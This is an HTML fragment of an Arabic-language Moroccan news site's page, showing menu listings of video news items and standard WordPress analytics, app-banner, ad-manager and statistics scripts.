+<div class="post-592542 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-2">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-2"><a href="https://www.achkayen.com/category/%d8%a2%d8%ae%d8%b1-%d8%a7%d9%84%d8%a3%d8%ae%d8%a8%d8%a7%d8%b1">آخر الأخبار</a></span></div>				<a  title="التيجيني يكشف خلفيات تنظيم المونديال وما خفي كان أعظم (فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241212-WA0081.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241212-WA0081-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/592542/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/592542/.html" class="post-title post-url">
+التيجيني يكشف خلفيات تنظيم المونديال وما خفي كان أعظم (فيديو)		</a>
+</p>	</div>
+</div >
+<div class="post-589438 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-20">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-20"><a href="https://www.achkayen.com/category/%d8%a5%d9%81%d8%aa%d8%aa%d8%a7%d8%ad%d9%8a%d8%a9">إفتتاحية التيجيني</a></span></div>				<a  title="التيجيني يكشف أسرار تاريخية عن الجمهورية الريفية الجزائرية(فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241126-WA0228.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241126-WA0228-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/589438/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/589438/.html" class="post-title post-url">
+التيجيني يكشف أسرار تاريخية عن الجمهورية الريفية الجزائرية(فيديو)		</a>
+</p>	</div>
+</div >
+</div>
+</div><div class="bs-pagination bs-ajax-pagination next_prev main-term-20 clearfix">
+<script>var bs_ajax_paginate_1303050747 = '{"query":{"paginate":"next_prev","show_label":1,"order_by":"date","count":4,"category":"20","_layout":{"state":"1|1|0","page":"1-col"}},"type":"wp_query","view":"Publisher::bs_pagin_ajax_mega_grid_posts","current_page":1,"ajax_url":"\/wp-admin\/admin-ajax.php","remove_duplicates":"0","paginate":"next_prev","_layout":{"state":"1|1|0","page":"1-col"},"_bs_pagin_token":"fbb7a49","data":{"vars":{"post-ranking-offset":6}}}';</script>				<a class="btn-bs-pagination prev disabled" rel="prev" data-id="1303050747"
+title="السابق">
+<i class="fa fa-angle-right"
+aria-hidden="true"></i> السابق				</a>
+<a  rel="next" class="btn-bs-pagination next"
+data-id="1303050747" title="التالي">
+التالي <i
+class="fa fa-angle-left" aria-hidden="true"></i>
+</a>
+</div>		</div>
+</div>
+<!-- Mega Menu End -->
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-8 better-anim-fade menu-item-has-children menu-item-has-mega menu-item-mega-grid-posts menu-item-1828"><a href="https://www.achkayen.com/category/%d9%81%d9%8a%d8%af%d9%8a%d9%88%d9%87%d8%a7%d8%aa-%d9%85%d8%ae%d8%aa%d8%a7%d8%b1%d8%a9">الفيديوتيك</a>
+<!-- Mega Menu Start -->
+<div class="mega-menu mega-grid-posts">
+<div class="content-wrap bs-tab-anim bs-tab-animated active">
+<div class="bs-pagination-wrapper main-term-8 next_prev ">
+<div class="listing listing-grid listing-grid-1 clearfix columns-4">
+<div class="post-595166 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="مستجدات قضية مول sh" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/Capture-decran-2024-12-25-094603.png?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/Capture-decran-2024-12-25-094603-750x430.png"						class="img-holder" href="https://www.achkayen.com/595166/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/595166/.html" class="post-title post-url">
+مستجدات قضية مول sh		</a>
+</p>	</div>
+</div >
+<div class="post-595028 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="التوفيق..&#8221;الهبة للبنات دون إشتراط الحيازة&#8221;" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29-1.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29-1-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/595028/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/595028/.html" class="post-title post-url">
+التوفيق..&#8221;الهبة للبنات دون إشتراط الحيازة&#8221;		</a>
+</p>	</div>
+</div >
+<div class="post-595008 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="الكشف عن تعديلات مدونة الأسرة" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/595008/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/595008/.html" class="post-title post-url">
+الكشف عن تعديلات مدونة الأسرة		</a>
+</p>	</div>
+</div >
+<div class="post-594959 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="صرخة تجار سوق الصالحين بسلا" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-23-at-17.18.50.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-23-at-17.18.50-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/594959/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/594959/.html" class="post-title post-url">
+صرخة تجار سوق الصالحين بسلا		</a>
+</p>	</div>
+</div >
+</div>
+</div><div class="bs-pagination bs-ajax-pagination next_prev main-term-8 clearfix">
+<script>var bs_ajax_paginate_1140811713 = '{"query":{"paginate":"next_prev","show_label":1,"order_by":"date","count":4,"category":"8","_layout":{"state":"1|1|0","page":"1-col"}},"type":"wp_query","view":"Publisher::bs_pagin_ajax_mega_grid_posts","current_page":1,"ajax_url":"\/wp-admin\/admin-ajax.php","remove_duplicates":"0","paginate":"next_prev","_layout":{"state":"1|1|0","page":"1-col"},"_bs_pagin_token":"1dc1bf4","data":{"vars":{"post-ranking-offset":6}}}';</script>				<a class="btn-bs-pagination prev disabled" rel="prev" data-id="1140811713"
+title="السابق">
+<i class="fa fa-angle-right"
+aria-hidden="true"></i> السابق				</a>
+<a  rel="next" class="btn-bs-pagination next"
+data-id="1140811713" title="التالي">
+التالي <i
+class="fa fa-angle-left" aria-hidden="true"></i>
+</a>
+</div>		</div>
+</div>
+<!-- Mega Menu End -->
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-11 better-anim-fade menu-item-226"><a href="https://www.achkayen.com/category/%d8%b1%d9%8a%d8%a7%d8%b6%d8%a9">رياضة</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-24 better-anim-fade menu-item-976"><a href="https://www.achkayen.com/category/%d8%a7%d9%84%d9%85%d8%b1%d8%a3%d8%a9">المرأة</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-term-9 better-anim-fade menu-item-225"><a href="https://www.achkayen.com/category/%d9%85%d8%ac%d8%aa%d9%85%d8%b9">مجتمع</a>
+<ul class="sub-menu">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-5 better-anim-fade menu-item-222"><a href="https://www.achkayen.com/category/%d8%ac%d9%87%d8%a7%d8%aa">جهات</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-31 better-anim-fade menu-item-977"><a href="https://www.achkayen.com/category/%d9%81%d9%86-%d9%88%d8%ab%d9%82%d8%a7%d9%81%d8%a9">فن وثقافة</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-33 better-anim-fade menu-item-1365"><a href="https://www.achkayen.com/category/%d9%85%d9%86%d9%88%d8%b9%d8%a7%d8%aa">منوعات</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-term-12 better-anim-fade menu-item-227"><a href="https://www.achkayen.com/category/%d8%b9%d8%a7%d9%84%d9%85">دولي</a>
+<ul class="sub-menu">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-10 better-anim-fade menu-item-228"><a href="https://www.achkayen.com/category/%d9%85%d8%ba%d8%a7%d8%b1%d8%a8%d8%a9-%d8%a7%d9%84%d8%b9%d8%a7%d9%84%d9%85">مغاربة العالم</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-term-26 better-anim-fade menu-item-967"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89">جناس كبرى</a>
+<ul class="sub-menu">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-27 better-anim-fade menu-item-970"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%ad%d9%88%d8%a7%d8%b1">حوار</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-28 better-anim-fade menu-item-969"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%aa%d8%ad%d9%82%d9%8a%d9%82">تحقيق</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-29 better-anim-fade menu-item-971"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%b1%d9%88%d8%a8%d9%88%d8%b1%d8%aa%d8%a7%d8%ac">روبورتاج</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-30 better-anim-fade menu-item-968"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%a8%d9%88%d8%b1%d8%aa%d8%b1%d9%8a%d9%87">بورتريه</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-292 better-anim-fade menu-item-16171"><a href="https://www.achkayen.com/category/%d8%b6%d9%8a%d9%81-%d8%a7%d9%84%d8%b3%d8%a8%d8%aa">ضيف السبت</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-293 better-anim-fade menu-item-16170"><a href="https://www.achkayen.com/category/%d8%b6%d9%8a%d9%81-%d8%a7%d9%84%d8%a3%d8%ad%d8%af">ضيف الأحد</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-4 better-anim-fade menu-item-221"><a href="https://www.achkayen.com/category/%d8%a5%d9%82%d8%aa%d8%b5%d8%a7%d8%af">مال وأعمال</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-21 better-anim-fade menu-item-1839"><a href="https://www.achkayen.com/category/%d9%83%d9%8f%d8%aa%d9%91%d8%a7%d8%a8-%d9%88%d8%a2%d8%b1%d8%a7%d8%a1">كُتّاب وآراء</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-18 better-anim-fade menu-item-has-children menu-item-has-mega menu-item-mega-grid-posts menu-item-1361"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">آشكاين TV</a>
+<!-- Mega Menu Start -->
+<div class="mega-menu mega-grid-posts">
+<div class="content-wrap bs-tab-anim bs-tab-animated active">
+<div class="bs-pagination-wrapper main-term-18 next_prev ">
+<div class="listing listing-grid listing-grid-1 clearfix columns-4">
+<div class="post-588441 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="كلمة ذ.محمد رفقي في الذكرى الستين لإنشاء المسجد الكبير بداكار" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/P1035931-scaled.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/P1035931-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/588441/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/588441/.html" class="post-title post-url">
+كلمة ذ.محمد رفقي في الذكرى الستين لإنشاء المسجد الكبير بداكار		</a>
+</p>	</div>
+</div >
+<div class="post-585416 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="حموشي يستلم علم الإنتربول" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/Screenshot_20241107_212055.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/Screenshot_20241107_212055-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/585416/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/585416/.html" class="post-title post-url">
+حموشي يستلم علم الإنتربول		</a>
+</p>	</div>
+</div >
+<div class="post-585113 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="الخطاب الملكي بمناسبة ذكرى المسيرة الخضراء" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241106-WA0108.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241106-WA0108-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/585113/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/585113/.html" class="post-title post-url">
+الخطاب الملكي بمناسبة ذكرى المسيرة الخضراء		</a>
+</p>	</div>
+</div >
+<div class="post-584315 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="عبقرية ملك" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/10/WhatsApp-Image-2024-10-31-at-12.48.48.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/10/WhatsApp-Image-2024-10-31-at-12.48.48-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/584315/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/584315/.html" class="post-title post-url">
+عبقرية ملك		</a>
+</p>	</div>
+</div >
+</div>
+</div><div class="bs-pagination bs-ajax-pagination next_prev main-term-18 clearfix">
+<script>var bs_ajax_paginate_1302718153 = '{"query":{"paginate":"next_prev","show_label":1,"order_by":"date","count":4,"category":"18","_layout":{"state":"1|1|0","page":"1-col"}},"type":"wp_query","view":"Publisher::bs_pagin_ajax_mega_grid_posts","current_page":1,"ajax_url":"\/wp-admin\/admin-ajax.php","remove_duplicates":"0","paginate":"next_prev","_layout":{"state":"1|1|0","page":"1-col"},"_bs_pagin_token":"e125afb","data":{"vars":{"post-ranking-offset":6}}}';</script>				<a class="btn-bs-pagination prev disabled" rel="prev" data-id="1302718153"
+title="السابق">
+</div>		</div>
+</div>
+<!-- Mega Menu End -->
+</li>
+</ul></div>
+</div>
+</div>
+</div>
+<script type="text/javascript">
+/* MonsterInsights Scroll Tracking */
+if ( typeof(jQuery) !== 'undefined' ) {
+jQuery( document ).ready(function(){
+function monsterinsights_scroll_tracking_load() {
+if ( ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) || ( typeof(__gtagTracker) !== 'undefined' && __gtagTracker ) ) {
+(function(factory) {
+factory(jQuery);
+}(function($) {
+/* Scroll Depth */
+"use strict";
+var defaults = {
+percentage: true
+};
+var $window = $(window),
+cache = [],
+scrollEventBound = false,
+lastPixelDepth = 0;
+/*
+* Plugin
+*/
+$.scrollDepth = function(options) {
+var startTime = +new Date();
+options = $.extend({}, defaults, options);
+/*
+* Functions
+*/
+function sendEvent(action, label, scrollDistance, timing) {
+if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
+return;
+}
+var paramName = action.toLowerCase();
+var fieldsArray = {
+send_to: 'G-123DG6L8ZX',
+non_interaction: true
+};
+fieldsArray[paramName] = label;
+if (arguments.length > 3) {
+fieldsArray.scroll_timing = timing
+MonsterInsightsObject.sendEvent('event', 'scroll_depth', fieldsArray);
+} else {
+MonsterInsightsObject.sendEvent('event', 'scroll_depth', fieldsArray);
+}
+}
+function calculateMarks(docHeight) {
+return {
+'25%' : parseInt(docHeight * 0.25, 10),
+'50%' : parseInt(docHeight * 0.50, 10),
+'75%' : parseInt(docHeight * 0.75, 10),
+/* Cushion to trigger 100% event in iOS */
+'100%': docHeight - 5
+};
+}
+function checkMarks(marks, scrollDistance, timing) {
+/* Check each active mark */
+$.each(marks, function(key, val) {
+if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
+sendEvent('Percentage', key, scrollDistance, timing);
+cache.push(key);
+}
+});
+}
+function rounded(scrollDistance) {
+/* Returns String */
+return (Math.floor(scrollDistance/250) * 250).toString();
+}
+function init() {
+bindScrollDepth();
+}
+/*
+* Public Methods
+*/
+/* Reset Scroll Depth with the originally initialized options */
+$.scrollDepth.reset = function() {
+cache = [];
+lastPixelDepth = 0;
+$window.off('scroll.scrollDepth');
+bindScrollDepth();
+};
+/* Add DOM elements to be tracked */
+$.scrollDepth.addElements = function(elems) {
+if (typeof elems == "undefined" || !$.isArray(elems)) {
+return;
+}
+$.merge(options.elements, elems);
+/* If scroll event has been unbound from window, rebind */
+if (!scrollEventBound) {
+bindScrollDepth();
+}
+};
+/* Remove DOM elements currently tracked */
+$.scrollDepth.removeElements = function(elems) {
+if (typeof elems == "undefined" || !$.isArray(elems)) {
+return;
+}
+$.each(elems, function(index, elem) {
+var inElementsArray = $.inArray(elem, options.elements);
+var inCacheArray = $.inArray(elem, cache);
+if (inElementsArray != -1) {
+options.elements.splice(inElementsArray, 1);
+}
+if (inCacheArray != -1) {
+cache.splice(inCacheArray, 1);
+}
+});
+};
+/*
+* Throttle function borrowed from:
+* Underscore.js 1.5.2
+* http://underscorejs.org
+* (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
+* Underscore may be freely distributed under the MIT license.
+*/
+function throttle(func, wait) {
+var context, args, result;
+var timeout = null;
+var previous = 0;
+var later = function() {
+previous = new Date;
+timeout = null;
+result = func.apply(context, args);
+};
+return function() {
+var now = new Date;
+if (!previous) previous = now;
+var remaining = wait - (now - previous);
+context = this;
+args = arguments;
+if (remaining <= 0) {
+clearTimeout(timeout);
+timeout = null;
+previous = now;
+result = func.apply(context, args);
+} else if (!timeout) {
+timeout = setTimeout(later, remaining);
+}
+return result;
+};
+}
+/*
+* Scroll Event
+*/
+function bindScrollDepth() {
+scrollEventBound = true;
+$window.on('scroll.scrollDepth', throttle(function() {
+/*
+* We calculate document and window height on each scroll event to
+* account for dynamic DOM changes.
+*/
+var docHeight = $(document).height(),
+winHeight = window.innerHeight ? window.innerHeight : $window.height(),
+scrollDistance = $window.scrollTop() + winHeight,
+/* Recalculate percentage marks */
+marks = calculateMarks(docHeight),
+/* Timing */
+timing = +new Date - startTime;
+checkMarks(marks, scrollDistance, timing);
+}, 500));
+}
+init();
+};
+/* UMD export */
+return $.scrollDepth;
+}));
+jQuery.scrollDepth();
+} else {
+setTimeout(monsterinsights_scroll_tracking_load, 200);
+}
+}
+monsterinsights_scroll_tracking_load();
+});
+}
+/* End MonsterInsights Scroll Tracking */
+</script><script type="text/javascript" src="https://www.achkayen.com/wp-content/plugins/appbanners/lib/smartbanner/jquery.smartbanner.min.js?ver=6.7.1" id="app-banners-scripts-js"></script>
+<script type="text/javascript" id="app-banners-custom-scripts-js-extra">
+/* <![CDATA[ */
+var appBannersConfig = {"title":"\u0622\u0634\u0643\u0627\u064a\u0646","author":"","price":"","appStoreLanguage":"AR","inAppStore":"On the App Store","inGooglePlay":"In Google Play","inAmazonAppStore":"In the Amazon Appstore","inWindowsStore":"In the Windows Store","GooglePlayParams":null,"icon":"https:\/\/www.achkayen.com\/wp-content\/uploads\/2023\/12\/331695658_903319377373126_8454005669306814186_n.jpg","iconGloss":"","url":"","button":"\u062a\u062d\u0645\u064a\u0644","scale":"auto","speedIn":"300","speedOut":"400","daysHidden":"0","daysReminder":"0","force":null,"hideOnInstall":"1","layer":"","iOSUniversalApp":"1","appendToSelector":"body","printViewPort":"1","pushSelector":"html"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://www.achkayen.com/wp-content/plugins/appbanners/js/config.min.js?ver=6.7.1" id="app-banners-custom-scripts-js"></script>
+<script type="text/javascript" src="https://stats.wp.com/e-202452.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
+<script type="text/javascript" id="jetpack-stats-js-after">
+/* <![CDATA[ */
+_stq = window._stq || [];
+_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"143439273\",\"post\":\"119\",\"tz\":\"1\",\"srv\":\"www.achkayen.com\",\"j\":\"1:14.1\"}") ]);
+_stq.push([ "clickTrackerInit", "143439273", "119" ]);
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://cdn.onesignal.com/sdks/OneSignalSDK.js?ver=1.0.0" id="remote_sdk-js" async="async" data-wp-strategy="async"></script>
+<script type="text/javascript" src="https://www.achkayen.com/wp-content/plugins/better-adsmanager/js/advertising.min.js?ver=1.21.0" id="better-advertising-js"></script>
+<script type="text/javascript" src="https://www.achkayen.com/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=8.0.1" id="wpb_composer_front_js-js"></script>
+<script type="text/javascript" async="async" src="https://www.achkayen.com/wp-content/bs-booster-cache/bebeffaab77653f52643d2aeda561533.js?ver=6.7.1" id="bs-booster-js"></script>
+<script>
+var xfquciwb=function(t){"use strict";return{init:function(){0==xfquciwb.ads_state()&&xfquciwb.blocked_ads_fallback()},ads_state:function(){return void 0!==window.better_ads_adblock},blocked_ads_fallback:function(){var a=[];t(".xfquciwb-container").each(function(){if("image"==t(this).data("type"))return 0;a.push({element_id:t(this).attr("id"),ad_id:t(this).data("adid")})}),a.length<1||jQuery.ajax({url:'https://www.achkayen.com/wp-admin/admin-ajax.php',type:"POST",data:{action:"better_ads_manager_blocked_fallback",ads:a},success:function(a){var e=JSON.parse(a);t.each(e.ads,function(a,e){t("#"+e.element_id).html(e.code)})}})}}}(jQuery);jQuery(document).ready(function(){xfquciwb.init()});
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8f77ee562cb76930","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2024.10.5","token":"f2fe84c1aff848338f950bba0dd7690a"}' crossorigin="anonymous"></script>
+</body>
+</html><!-- WP Fastest Cache file was created in 1.8590378761292 seconds, on 25-12-24 10:38:26 --><!-- need to refresh to see cached version -->
